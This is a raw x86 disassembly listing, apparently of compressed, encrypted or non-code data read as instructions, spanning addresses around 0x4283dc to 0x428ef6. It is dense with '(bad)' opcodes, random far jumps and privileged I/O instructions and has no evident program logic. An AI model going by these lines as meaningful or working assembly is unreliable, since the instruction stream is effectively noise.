  4283dc:	fnsave [esi]
  4283de:	cs push di
  4283e1:	test   eax,0x6d88d351
  4283e6:	mov    ah,BYTE PTR [ecx+ebx*4-0x11f1f5e]
  4283ed:	sbb    BYTE PTR [eax-0x63b8ee64],ah
  4283f3:	imul   esi,DWORD PTR [esi+0x3c5ef0b4],0x2b
  4283fa:	ins    DWORD PTR es:[edi],dx
  4283fb:	iretw  
  4283fd:	and    eax,0x3f4a10e2
  428402:	rcr    BYTE PTR [ebp-0x7d1454f0],0x3f
  428409:	icebp  
  42840a:	sbb    al,bl
  42840c:	in     eax,dx
  42840d:	rcl    edi,0x52
  428410:	scas   eax,DWORD PTR es:[edi]
	...
  428471:	add    BYTE PTR [eax],al
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x36abfb32
  428481:	das    
  428482:	jmp    0x500:0x1af19d9
  428489:	add    DWORD PTR [eax],eax
  42848b:	add    BYTE PTR [ebp+0x77],ch
  42848e:	das    
  42848f:	daa    
  428490:	in     al,0x99
  428492:	mov    ah,0xf2
  428494:	dec    edi
  428495:	jns    0x4284a9
  428497:	lods   al,BYTE PTR ds:[esi]
  428498:	inc    ebp
  428499:	jmp    0x4e8e346f
  42849e:	xor    edx,DWORD PTR [edi]
  4284a0:	push   ds
  4284a1:	aad    0xda
  4284a3:	iret   
  4284a4:	and    eax,0xb4dbc22d
  4284a9:	mov    ebx,0x20b30521
  4284ae:	pop    ds
  4284af:	mov    es,esi
  4284b1:	xchg   DWORD PTR [ecx],ebp
  4284b3:	add    esi,ecx
  4284b5:	popw   ds
  4284b7:	xchg   esi,eax
  4284b8:	inc    ebp
  4284b9:	jnp    0x4284b8
  4284bb:	push   ecx
  4284bc:	test   eax,0x683b3890
  4284c1:	mov    eax,ds:0x7458ee48
  4284c6:	aam    0x77
  4284c8:	ret    
  4284c9:	fnstsw WORD PTR [eax+0x5c45724d]
  4284cf:	mov    gs,WORD PTR [esi-0x32]
  4284d2:	call   0xeb36b6ba
  4284d7:	out    dx,eax
  4284d8:	out    dx,eax
  4284d9:	je     0x4284a0
  4284db:	mov    ebp,0x8783469e
  4284e0:	nop
  4284e1:	(bad)  
  4284e2:	jnp    0x428524
  4284e4:	icebp  
  4284e5:	push   dx
  4284e7:	dec    edi
  4284e8:	dec    ebp
  4284e9:	xchg   ebx,eax
  4284ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284eb:	js     0x428565
  4284ed:	mov    bh,0xed
  4284ef:	adc    BYTE PTR [esi],dl
  4284f1:	cmp    esp,ebx
  4284f3:	or     al,0xa2
  4284f5:	jb     0x4284a0
  4284f7:	mov    al,0xab
  4284f9:	popf   
  4284fa:	mov    bh,0x49
  4284fc:	add    DWORD PTR [ebx-0x1c],eax
  4284ff:	mov    esi,0xab2d1970
  428504:	mov    BYTE PTR [ecx+ecx*1-0x38],ah
  428508:	add    edi,DWORD PTR [eax-0x1c2d0f21]
  42850e:	dec    edx
  42850f:	and    al,0x6d
  428511:	sub    al,0x27
  428513:	ss xchg edx,eax
  428515:	icebp  
  428516:	sbb    eax,0x3acabd1c
  42851b:	arpl   ax,bx
  42851d:	pop    esi
  42851e:	and    al,0xca
  428520:	xchg   ebx,eax
  428521:	scas   eax,DWORD PTR es:[edi]
  428522:	xchg   BYTE PTR [eax+ebx*8+0x3e],cl
  428526:	mov    ds:0x67b1b722,eax
  42852b:	ins    BYTE PTR es:[edi],dx
  42852c:	addr16 int 0xf3
  42852f:	bound  ebx,QWORD PTR [esi+0x7d]
  428532:	das    
  428533:	push   eax
  428534:	enter  0x5f4e,0xa9
  428538:	push   ss
  428539:	pop    ss
  42853a:	and    eax,0xaa02e29e
  42853f:	push   ebp
  428540:	outs   dx,DWORD PTR ds:[esi]
  428541:	les    ebx,FWORD PTR [ecx+0x5d]
  428544:	bound  ebx,QWORD PTR [edx+eax*2+0x6b]
  428548:	mov    edx,0xaf73d497
  42854d:	out    0xa6,eax
  42854f:	mov    cl,0xe0
  428551:	sub    BYTE PTR [ebp+esi*4-0x34],bl
  428555:	(bad)  
  428557:	push   0xeeb82632
  42855c:	ins    BYTE PTR es:[edi],dx
  42855d:	pop    ss
  42855e:	mov    ch,0x20
  428560:	test   BYTE PTR [ecx+eiz*8],0xd5
  428564:	push   cs
  428565:	mov    dl,dl
  428567:	xor    DWORD PTR [ebx],esp
  428569:	mov    al,ds:0x2330f42d
  42856e:	jnp    0x42852d
  428570:	lods   al,BYTE PTR ds:[esi]
  428571:	cmp    BYTE PTR [eax+0x99ba005],bh
  428577:	jg     0x42853f
  428579:	aam    0x53
  42857b:	dec    edi
  42857c:	dec    ebp
  42857d:	ror    BYTE PTR [edi+eax*2-0x19978ffb],0x6a
  428585:	cmp    BYTE PTR [edi-0x355a243f],cl
  42858b:	jnp    0x428530
  42858d:	push   ss
  42858e:	(bad)  
  428590:	inc    edx
	...
  4285f1:	add    BYTE PTR [eax],al
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x4813a3f6
  428602:	repnz out 0x1e,al
  428605:	mov    al,0x1
  428607:	add    BYTE PTR ds:0xe4000001,al
  42860d:	jne    0x4285b3
  42860f:	bound  ebx,QWORD PTR ds:0x132d5f9c
  428615:	dec    edi
  428616:	ja     0x4285ac
  428618:	jg     0x4285b8
  42861a:	xor    ch,BYTE PTR [ebx]
  42861c:	fwait
  42861d:	mov    esp,0x57450237
  428622:	cmp    dl,dh
  428624:	stos   BYTE PTR es:[edi],al
  428625:	push   edx
  428626:	pop    ebp
  428627:	push   0x114b4c14
  42862c:	retf   
  42862d:	lea    edx,[edx]
  42862f:	and    edi,ebp
  428631:	sub    eax,0x848c9773
  428636:	in     eax,dx
  428637:	or     BYTE PTR [esi-0x4481c8c4],bl
  42863d:	call   0xd143:0x42bdd749
  428644:	mov    BYTE PTR [edx+0x67194303],dh
  42864a:	aaa    
  42864b:	pop    ds
  42864c:	xor    ebx,edi
  42864e:	mov    ch,0x1e
  428650:	or     al,0x8d
  428652:	int    0x36
  428654:	adc    al,BYTE PTR [eax+0x8]
  428657:	(bad)  
  428659:	mov    bl,0xc2
  42865b:	int3   
  42865c:	mov    al,0xa3
  42865e:	pop    eax
  42865f:	dec    ebx
  428660:	xchg   esp,eax
  428661:	sub    BYTE PTR [edi+edi*2-0x1db14ea7],0xc7
  428669:	add    BYTE PTR [edi+ebp*4-0x7d],ch
  42866d:	cmp    ebp,eax
  42866f:	xchg   edi,eax
  428670:	cmovg  edx,DWORD PTR [edx]
  428673:	push   es
  428674:	adc    dl,BYTE PTR ds:0x27c029da
  42867a:	mov    cl,ah
  42867c:	dec    eax
  42867d:	and    dh,ah
  42867f:	inc    ecx
  428680:	test   DWORD PTR [ebx+0x7e3e111],ebp
  428686:	pusha  
  428687:	int    0xa9
  428689:	test   BYTE PTR [ebx+eax*2-0x117ecc7],ah
  428690:	loop   0x4286d3
  428692:	mov    dl,0xdb
  428694:	in     al,0x12
  428696:	pop    ebp
  428697:	cld    
  428698:	cmp    BYTE PTR [edx],0x24
  42869b:	or     ebp,DWORD PTR [eax]
  42869d:	bound  esi,QWORD PTR [eax]
  42869f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4286a0:	loopne 0x428667
  4286a2:	das    
  4286a3:	adc    DWORD PTR [ebp-0x7ef1b862],0x4a44533e
  4286ad:	jne    0x4286f5
  4286af:	mov    ah,bh
  4286b1:	mov    ebx,0xfae81552
  4286b6:	pop    ecx
  4286b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4286b8:	gs pop eax
  4286ba:	pusha  
  4286bb:	cmp    eax,0xa2375dc8
  4286c0:	retf   0xe259
  4286c3:	push   eax
  4286c4:	and    ecx,ebp
  4286c6:	ror    cl,1
  4286c8:	in     al,0xc8
  4286ca:	mov    al,0x52
  4286cc:	stos   BYTE PTR es:[edi],al
  4286cd:	jne    0x4286ef
  4286cf:	add    eax,0x5207007b
  4286d4:	call   0x3f8f:0x8e6c86a2
  4286db:	test   eax,0xe6bbd1b
  4286e0:	out    dx,al
  4286e1:	fimul  WORD PTR [edi]
  4286e3:	xchg   DWORD PTR [edx-0x44738ab0],esp
  4286e9:	pop    ss
  4286ea:	(bad)  
  4286eb:	sbb    bl,BYTE PTR [esi+ecx*2+0x429a77a3]
  4286f2:	push   esi
  4286f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4286f4:	jmp    0xc9346604
  4286f9:	mov    ?,WORD PTR [eax+0x58]
  4286fc:	or     bh,al
  4286fe:	cli    
  4286ff:	ins    DWORD PTR es:[edi],dx
  428700:	jnp    0x42873c
  428702:	push   eax
  428703:	xchg   ebp,eax
  428704:	fcom   QWORD PTR gs:[eax]
  428707:	les    eax,FWORD PTR [ecx+0x151ad543]
  42870d:	imul   ebp,DWORD PTR [ecx-0x14],0xe0
	...
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0xda93af96
  428783:	test   eax,0x1b123
  428788:	add    eax,0x30000001
  42878d:	fwait
  42878e:	icebp  
  42878f:	int    0xb8
  428791:	cdq    
  428792:	pop    eax
  428793:	xor    BYTE PTR [ecx-0x46390d68],bh
  428799:	cs add al,0x70
  42879c:	xchg   bp,ax
  42879e:	sbb    bl,BYTE PTR [ebx+0x23]
  4287a1:	mov    BYTE PTR [ecx-0x23eb7b8c],bl
  4287a7:	mov    esi,0xeea2ec3f
  4287ac:	pop    edx
  4287ad:	adc    bl,BYTE PTR [edx+esi*4]
  4287b0:	jmp    0x4287c5
  4287b2:	pop    ss
  4287b3:	inc    edi
  4287b4:	out    0xfc,eax
  4287b6:	jno    0x4287a7
  4287b8:	mov    ah,0xa0
  4287ba:	add    eax,0x3308d4d8
  4287bf:	jle    0x4287b3
  4287c1:	js     0x4287d9
  4287c3:	jnp    0x428836
  4287c5:	xlat   BYTE PTR ds:[ebx]
  4287c6:	sbb    BYTE PTR [esi+eiz*4],ah
  4287c9:	mov    ebx,0xfcd1f51f
  4287ce:	xor    eax,0xe0e37a01
  4287d3:	arpl   WORD PTR [ebx],dx
  4287d5:	pop    edi
  4287d6:	sti    
  4287d7:	aad    0xa4
  4287d9:	inc    esp
  4287da:	into   
  4287db:	int    0xbd
  4287dd:	into   
  4287de:	jmp    0x95e1eb10
  4287e3:	enter  0x8b51,0x95
  4287e7:	cs inc eax
  4287e9:	adc    DWORD PTR [edx+ecx*4-0xa],esi
  4287ed:	jmp    0x428817
  4287ef:	push   ebp
  4287f0:	clc    
  4287f1:	push   0x8e235320
  4287f6:	and    BYTE PTR [ebx-0x56f50a57],al
  4287fc:	inc    eax
  4287fd:	test   BYTE PTR [edx],0xfd
  428800:	jbe    0x428855
  428802:	fprem1 
  428804:	mov    ebx,0xf7eb763b
  428809:	call   0x88dade6f
  42880e:	fdiv   st,st(4)
  428810:	inc    edi
  428811:	jne    0x428874
  428813:	js     0x428821
  428815:	daa    
  428816:	popa   
  428817:	add    DWORD PTR [ebx+0x13],ecx
  42881a:	loope  0x42886d
  42881c:	jmp    0x8cf6:0x20d628b0
  428823:	or     ch,bl
  428825:	das    
  428826:	sahf   
  428827:	dec    esp
  428828:	pop    ebx
  428829:	pop    ecx
  42882a:	(bad)  
  42882b:	cmp    bl,BYTE PTR [ebx+0x2c9eda64]
  428831:	adc    ch,ah
  428833:	jb     0x428856
  428835:	in     eax,dx
  428836:	pop    es
  428837:	cmp    BYTE PTR [ecx+0x488539c8],0xfc
  42883e:	out    dx,eax
  42883f:	sub    ah,BYTE PTR [edx+0x40]
  428842:	aas    
  428843:	and    BYTE PTR [esi-0x10],ch
  428846:	or     eax,0xb47dd93c
  42884b:	sbb    ebp,DWORD PTR ds:0xc6cf2c25
  428851:	push   ebp
  428852:	xlat   BYTE PTR ds:[ebx]
  428853:	adc    eax,0xec22bc9d
  428858:	jl     0x428867
  42885a:	sub    edx,edi
  42885c:	shl    DWORD PTR [esi+0x5a],cl
  42885f:	mov    ebx,eax
  428861:	out    dx,eax
  428862:	jmp    0x725d:0x5b7bec5c
  428869:	test   al,0x55
  42886b:	aas    
  42886c:	mov    bh,0x58
  42886e:	stc    
  42886f:	fldenv [ebp-0x3]
  428872:	cmp    BYTE PTR [ebx-0x6e],0xde
  428876:	mov    esi,0xb099226c
  42887b:	fnstenv [ebx-0x433fae2a]
  428881:	push   ss
  428882:	fimul  DWORD PTR [eax+0x2aeeaa44]
  428888:	imul   ebx,DWORD PTR [esp+ebx*1-0x1ba8fda1],0xffffffe1
  428890:	pop    eax
	...
  4288f1:	add    BYTE PTR [eax],al
  4288f3:	add    BYTE PTR [esi],ah
  4288f5:	jp     0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi+0x49629d0f],bx
  428902:	sub    esi,DWORD PTR [eax+ebp*1-0x4e]
  428906:	add    DWORD PTR [eax],eax
  428908:	add    eax,0x12000001
  42890d:	sbb    ecx,DWORD PTR [ecx-0x14]
  428910:	fdiv   DWORD PTR [eax-0x5f686257]
  428916:	push   edi
  428917:	or     ecx,esi
  428919:	fwait
  42891a:	popa   
  42891b:	scas   eax,DWORD PTR es:[edi]
  42891c:	dec    ebp
  42891d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42891e:	sub    cl,BYTE PTR [edx]
  428920:	xor    al,BYTE PTR [edx+0x5e]
  428923:	loope  0x42892e
  428925:	in     eax,dx
  428926:	push   ebp
  428927:	push   0xf110aa6c
  42892c:	sbb    al,bl
  42892e:	mov    cl,0x40
  428930:	dec    edi
  428931:	cmp    al,0xf4
  428933:	or     ebp,esi
  428935:	pop    esp
  428936:	aas    
  428937:	inc    edx
  428938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428939:	jae    0x428999
  42893b:	outs   dx,BYTE PTR ds:[esi]
  42893c:	adc    al,0x1d
  42893e:	dec    esp
  42893f:	or     edi,DWORD PTR [eax+0x34fadd49]
  428945:	mov    eax,0x3373b976
  42894a:	aaa    
  42894b:	jae    0x4288e1
  42894d:	fisttp QWORD PTR [edx+0x1a9c7ce9]
  428953:	(bad)  
  428954:	sub    dl,BYTE PTR [ecx+0x3cd9ddf9]
  42895a:	test   al,cl
  42895c:	cmp    BYTE PTR [bx+di+0x41a4],cl
  428961:	push   cs
  428962:	push   0x142d8e1
  428967:	ja     0x42899e
  428969:	xchg   DWORD PTR [esi],ebx
  42896b:	test   DWORD PTR [eax-0x6a],ecx
  42896e:	mov    WORD PTR [ebx+0x2a471062],ss
  428974:	das    
  428975:	mov    ah,0x29
  428977:	mov    edi,ds
  428979:	stc    
  42897a:	mov    eax,0xa73e58cd
  42897f:	int    0xaa
  428981:	push   esi
  428982:	xchg   ecx,eax
  428983:	cmp    al,0x50
  428985:	xor    eax,0xb52af3f0
  42898a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42898b:	mov    eax,ds:0x308c7ce3
  428990:	adc    BYTE PTR [edi],ch
  428992:	push   es
  428993:	ret    0x217a
  428996:	inc    esp
  428997:	mov    bl,bh
  428999:	(bad)  
  42899a:	cld    
  42899b:	pop    ebx
  42899c:	jl     0x428971
  42899e:	and    eax,0xa2ef58b2
  4289a3:	pop    edi
  4289a4:	inc    ebx
  4289a5:	cmc    
  4289a6:	jg     0x42892a
  4289a8:	repz xchg edx,eax
  4289aa:	jle    0x428945
  4289ac:	and    DWORD PTR [eax+0x41024d7b],0xffffff8f
  4289b3:	adc    BYTE PTR [esi-0x2f1c9592],ch
  4289b9:	xor    cl,BYTE PTR [esi+0x3a]
  4289bc:	(bad)  
  4289bd:	cbw    
  4289bf:	ret    0x345
  4289c2:	jnp    0x4289a9
  4289c4:	ret    
  4289c5:	in     eax,dx
  4289c6:	nop
  4289c7:	xor    DWORD PTR [eax+ebp*2+0x6d],edx
  4289cb:	mov    al,0x7c
  4289cd:	(bad)  
  4289ce:	push   eax
  4289cf:	and    edx,esi
  4289d1:	rol    DWORD PTR [esi-0x22e12a5d],1
  4289d7:	addps  xmm7,xmm0
  4289da:	sbb    ch,bh
  4289dc:	mov    ecx,0x5bf77aa8
  4289e1:	or     BYTE PTR [esi+0x31c2bc4e],0xfe
  4289e8:	or     dl,0x87
  4289eb:	dec    edi
  4289ec:	xor    DWORD PTR [esi-0x7b561f36],ebp
  4289f2:	jmp    0xf823531e
  4289f7:	ins    BYTE PTR es:[edi],dx
  4289f8:	imul   edi,DWORD PTR [eax-0xf],0xffffffb4
  4289fc:	test   eax,0x89bb2fa1
  428a01:	add    edx,0x1b
  428a04:	mov    cl,0x88
  428a06:	daa    
  428a07:	and    BYTE PTR [ecx+edx*8+0x76],dh
  428a0b:	mov    al,0xd6
  428a0d:	shl    DWORD PTR [esi-0x33],1
  428a10:	jne    0x428a12
	...
  428a72:	add    BYTE PTR [eax],al
  428a74:	dec    ebp
  428a75:	or     al,0xf8
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x12b5bf13]
  428a83:	into   
  428a84:	sub    eax,0x50001b3
  428a89:	add    DWORD PTR [eax],eax
  428a8b:	add    BYTE PTR [edx],bl
  428a8d:	jmp    FWORD PTR [edx]
  428a8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428a90:	shl    BYTE PTR ds:0xbeb2b0c2,cl
  428a96:	stc    
  428a97:	rcl    DWORD PTR [esi],cl
  428a99:	cmp    eax,0xee919033
  428a9e:	test   DWORD PTR [ebp-0x2a],0xbd11c7d9
  428aa5:	sub    edx,DWORD PTR ds:0x7fe6fe79
  428aab:	fldcw  WORD PTR [esi+0x61d6718e]
  428ab1:	xor    DWORD PTR [edi],esi
  428ab3:	mov    eax,0x4613a9ee
  428ab8:	mov    ch,0xe8
  428aba:	mov    cl,0x93
  428abc:	xchg   edx,eax
  428abd:	call   0x9a66707d
  428ac2:	rcl    DWORD PTR [edx-0x3c],cl
  428ac5:	inc    ecx
  428ac6:	(bad)  
  428ac8:	mov    esi,esp
  428aca:	mov    bl,0xab
  428acc:	mov    BYTE PTR [eax-0x7e],bl
  428acf:	(bad)  
  428ad0:	int3   
  428ad1:	fsubr  DWORD PTR [ebx-0x4]
  428ad4:	bound  edx,QWORD PTR [edi]
  428ad6:	adc    cl,BYTE PTR ds:0xaff3c4d
  428adc:	jmp    0x428b4a
  428ade:	jmp    0xfdbe5c43
  428ae3:	mov    ecx,0xb0a603e7
  428ae8:	cmp    al,0x8a
  428aea:	xor    al,0x99
  428aec:	hlt    
  428aed:	in     al,dx
  428aee:	add    BYTE PTR [ebp+0x3c],ch
  428af1:	outs   dx,DWORD PTR ds:[esi]
  428af2:	in     eax,dx
  428af3:	and    eax,0x8d7d56f9
  428af8:	push   esi
  428af9:	iret   
  428afa:	and    DWORD PTR [ebp+0xff2ea0a],ebp
  428b00:	inc    esi
  428b01:	nop
  428b02:	cmp    DWORD PTR [ebx+0x1872c661],edi
  428b08:	pushf  
  428b09:	xor    DWORD PTR cs:[ecx-0x6d],eax
  428b0d:	shr    BYTE PTR [ebx+0x29950e8c],1
  428b13:	(bad)
  428b17:	inc    edx
  428b18:	adc    eax,0x4bbc7593
  428b1d:	xchg   ebx,eax
  428b1e:	neg    ebp
  428b20:	sub    dl,bh
  428b22:	jno    0x428ad3
  428b24:	mov    ecx,0xb8331c9
  428b29:	jmp    0xd64f:0xaf9e14da
  428b30:	data16 arpl WORD PTR [ebp-0x70],dx
  428b34:	mov    eax,0x9bffb9f9
  428b39:	push   eax
  428b3a:	mov    ebp,0xe13faa6d
  428b3f:	cmp    al,cl
  428b41:	push   ss
  428b42:	xor    ebx,DWORD PTR es:[ebx+0x48]
  428b46:	mov    al,0xf
  428b48:	cmp    DWORD PTR [ebx+0x7a],ecx
  428b4b:	add    DWORD PTR [esi-0xe],edi
  428b4e:	pop    esp
  428b4f:	jge    0x428aff
  428b51:	mov    bl,ah
  428b53:	aas    
  428b54:	lock pop eax
  428b56:	dec    esp
  428b57:	shl    DWORD PTR [esi-0x67faa263],1
  428b5d:	cmp    BYTE PTR [ebx+0x8dd27bb],al
  428b63:	loope  0x428b44
  428b65:	mov    ah,0x49
  428b67:	fcmovb st,st(1)
  428b69:	scas   al,BYTE PTR es:[edi]
  428b6a:	and    bh,BYTE PTR [ebx+edi*8+0x1d]
  428b6e:	jmp    0x428b13
  428b70:	sahf   
  428b71:	mov    eax,ds:0x101e65aa
  428b76:	jo     0x428b15
  428b78:	lock add eax,0x8645cdf7
  428b7e:	lahf   
  428b7f:	jne    0x428b24
  428b81:	mov    ch,0xa8
  428b83:	xor    eax,0x3c0519b
  428b88:	std    
  428b89:	dec    ecx
  428b8a:	(bad)  
  428b8b:	push   ds
  428b8c:	jmp    0x0:0x7fd8473
	...
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x8db8347b
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [ecx-0x17],ch
  428c0e:	push   ds
  428c0f:	test   eax,0xecd6d3f6
  428c14:	aam    0xe7
  428c16:	std    
  428c17:	shl    BYTE PTR [ebx-0x4a74422a],0x26
  428c1e:	and    eax,0x2ed4d472
  428c23:	ins    BYTE PTR es:[edi],dx
  428c24:	(bad)  
  428c25:	cdq    
  428c26:	ja     0x428c5d
  428c28:	and    al,0x97
  428c2a:	cmp    DWORD PTR [esi],esi
  428c2c:	mov    al,ds:0xe3f0ede9
  428c31:	mov    dh,0xe9
  428c33:	xor    ah,ch
  428c35:	add    al,0xcd
  428c37:	test   eax,0x9167378
  428c3c:	test   al,0xa0
  428c3e:	jge    0x428bea
  428c40:	jmp    0xef04:0x39bb0e6e
  428c47:	test   DWORD PTR [ebx+0x0],0x8861238
  428c4e:	gs sbb al,0x8d
  428c51:	mov    edi,0x34a8d7e0
  428c56:	test   DWORD PTR [ecx],ebx
  428c58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c59:	pushf  
  428c5a:	mov    ecx,0xd10bffb3
  428c5f:	fadd   st,st(4)
  428c61:	idiv   DWORD PTR [ebx+edi*4-0x566fbcb1]
  428c68:	idiv   DWORD PTR [esp+ebx*2-0x5b]
  428c6c:	xlat   BYTE PTR ds:[ebx]
  428c6d:	mov    ah,0x25
  428c6f:	adc    esp,DWORD PTR ds:0xf13a68a2
  428c75:	sub    eax,0x19b81f1d
  428c7a:	sbb    al,0xe
  428c7c:	(bad)  
  428c7e:	call   0x6a63:0x3252f346
  428c85:	mov    ebp,0x786d3bff
  428c8a:	mov    bl,0xa3
  428c8c:	or     eax,0xc60bd573
  428c91:	retf   
  428c92:	jle    0x428ce5
  428c94:	cli    
  428c95:	inc    esp
  428c96:	jmp    0x428ce8
  428c98:	(bad)  
  428c99:	out    0x1b,al
  428c9b:	cwde   
  428c9c:	pop    ebp
  428c9d:	mov    ebp,esp
  428c9f:	into   
  428ca0:	ins    BYTE PTR es:[edi],dx
  428ca1:	mov    esp,0x555db546
  428ca6:	fld    QWORD PTR cs:[edi+0x60]
  428caa:	das    
  428cab:	sahf   
  428cac:	dec    eax
  428cad:	add    eax,0xb3aa8d14
  428cb2:	por    mm5,QWORD PTR [ebx-0x27]
  428cb6:	bound  edi,QWORD PTR [ebx-0x3c64b43d]
  428cbc:	sub    ebx,DWORD PTR [edi+0x1a]
  428cbf:	int    0x8
  428cc1:	jle    0x428cb1
  428cc3:	adc    eax,DWORD PTR [ebp+0x1327cd90]
  428cc9:	ja     0x428d06
  428ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ccc:	les    edi,FWORD PTR ss:[esi]
  428ccf:	jb     0x428ccd
  428cd1:	inc    esp
  428cd2:	fwait
  428cd3:	hlt    
  428cd4:	sub    ch,al
  428cd6:	or     al,0x49
  428cd8:	clc    
  428cd9:	pop    ds
  428cda:	retf   
  428cdb:	test   DWORD PTR fs:[edi+edi*8],0x4ffb01dd
  428ce3:	bound  ebx,QWORD PTR [edx+0x41]
  428ce6:	(bad)  
  428ce7:	js     0x428d0f
  428ce9:	arpl   dx,sp
  428ceb:	pop    esp
  428cec:	clc    
  428ced:	mov    ah,0xd
  428cef:	js     0x428d00
  428cf1:	(bad)  
  428cf2:	sti    
  428cf3:	pop    esp
  428cf4:	jge    0x428ccc
  428cf6:	popf   
  428cf7:	pusha  
  428cf8:	pop    es
  428cf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428cfa:	and    al,0x71
  428cfc:	or     eax,0xdf4883e6
  428d01:	pop    ebp
  428d02:	icebp  
  428d03:	test   BYTE PTR [ebx-0x37f48847],ah
  428d09:	jne    0x428d5d
  428d0b:	fs or  dl,ch
  428d0e:	into   
  428d0f:	pop    ecx
  428d10:	dec    ebx
	...
  428d71:	add    BYTE PTR [eax],al
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0xf175
  428d82:	pop    ecx
  428d83:	mov    cl,0x37
  428d85:	mov    ch,0x1
  428d87:	add    BYTE PTR ds:0x46000001,al
  428d8d:	lods   al,BYTE PTR ds:[esi]
  428d8e:	mov    dh,0x3c
  428d90:	rol    BYTE PTR [ecx],1
  428d92:	mov    ?,WORD PTR ds:0xa237caf3
  428d98:	adc    cl,BYTE PTR [edi+esi*1]
  428d9b:	fbld   TBYTE PTR [edi-0x48c8014c]
  428da1:	push   ebp
  428da2:	lock mov ch,0x3e
  428da5:	dec    eax
  428da6:	je     0x428da4
  428da8:	mov    esp,0x21614cef
  428dad:	push   ecx
  428dae:	fld    QWORD PTR [edx+0x29d1293]
  428db4:	pop    esp
  428db5:	sub    ah,dh
  428db7:	adc    ebp,DWORD PTR [ebp-0xc62c6ad]
  428dbd:	xor    DWORD PTR [edx+0x1b15d475],ebp
  428dc3:	stos   BYTE PTR es:[edi],al
  428dc4:	jb     0x428e17
  428dc6:	cmp    al,0xa9
  428dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428dc9:	inc    edx
  428dca:	inc    eax
  428dcb:	ins    BYTE PTR es:[edi],dx
  428dcc:	sbb    BYTE PTR [ebx+0xb],bl
  428dcf:	xchg   ecx,eax
  428dd0:	push   0xffffff84
  428dd2:	mov    eax,0x84a75a60
  428dd7:	mov    edi,0xe5b25025
  428ddc:	loop   0x428dad
  428dde:	push   ecx
  428ddf:	dec    eax
  428de0:	lods   al,BYTE PTR ds:[esi]
  428de1:	sub    BYTE PTR [edx],ah
  428de3:	fisttp WORD PTR [eax-0x12abc600]
  428de9:	inc    DWORD PTR [edi-0x6]
  428dec:	jl     0x428d83
  428dee:	xchg   edx,eax
  428def:	fst    DWORD PTR [ecx-0x3e]
  428df2:	add    DWORD PTR [ecx],0x5e
  428df5:	(bad)  [edi-0x1d291db5]
  428dfb:	jle    0x428e4d
  428dfd:	lods   al,BYTE PTR ds:[esi]
  428dfe:	jle    0x428e6f
  428e00:	sbb    bl,BYTE PTR [eiz*8+0x2fe15072]
  428e07:	push   ebp
  428e08:	cmp    ecx,DWORD PTR [esp+eax*2]
  428e0b:	push   ss
  428e0c:	stc    
  428e0d:	add    BYTE PTR [eax],ch
  428e0f:	pop    es
  428e10:	retf   
  428e11:	mov    ch,0x30
  428e13:	int3   
  428e14:	fld    DWORD PTR [ebx-0x7ce75234]
  428e1a:	or     DWORD PTR [esi],ebx
  428e1c:	imul   edi,DWORD PTR [ebp+eiz*8-0x303db592],0x69b37f32
  428e27:	(bad)  
  428e29:	lea    esi,[edx-0x6894195b]
  428e2f:	jbe    0x428e30
  428e31:	lods   eax,DWORD PTR ds:[esi]
  428e32:	xchg   BYTE PTR [eax-0x4f35e7cf],bh
  428e38:	in     al,0x3f
  428e3a:	push   ebp
  428e3b:	repnz fstp st(1)
  428e3e:	dec    ecx
  428e40:	mov    edx,0x36ea2b91
  428e45:	aad    0x25
  428e47:	ins    BYTE PTR es:[edi],dx
  428e48:	int3   
  428e49:	dec    ebp
  428e4a:	mov    eax,0x7bcdf22e
  428e4f:	ret    
  428e50:	mov    BYTE PTR [ecx-0x54],bl
  428e53:	mov    ds:0xbad2e90c,al
  428e58:	xchg   BYTE PTR [ebx],bl
  428e5a:	ins    DWORD PTR es:[edi],dx
  428e5b:	xchg   BYTE PTR ds:0xd2dcce76,ah
  428e61:	mov    eax,ds:0x2a95a291
  428e66:	neg    DWORD PTR [edx]
  428e68:	retf   
  428e69:	push   eax
  428e6a:	sub    al,0xcc
  428e6c:	ret    0x45ab
  428e6f:	cwde   
  428e70:	lock xor ecx,DWORD PTR [ecx-0x38]
  428e74:	aam    0x1a
  428e76:	aam    0xb8
  428e78:	jle    0x428e8e
  428e7a:	cwde   
  428e7b:	aaa    
  428e7c:	or     dh,BYTE PTR [ecx]
  428e7e:	fwait
  428e7f:	jl     0x428e7b
  428e81:	jne    0x428e8d
  428e83:	mov    al,0xa5
  428e85:	mov    edx,0x62608ed7
  428e8a:	mov    eax,ds:0x3a121094
  428e8f:	dec    esi
  428e90:	dec    esi
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
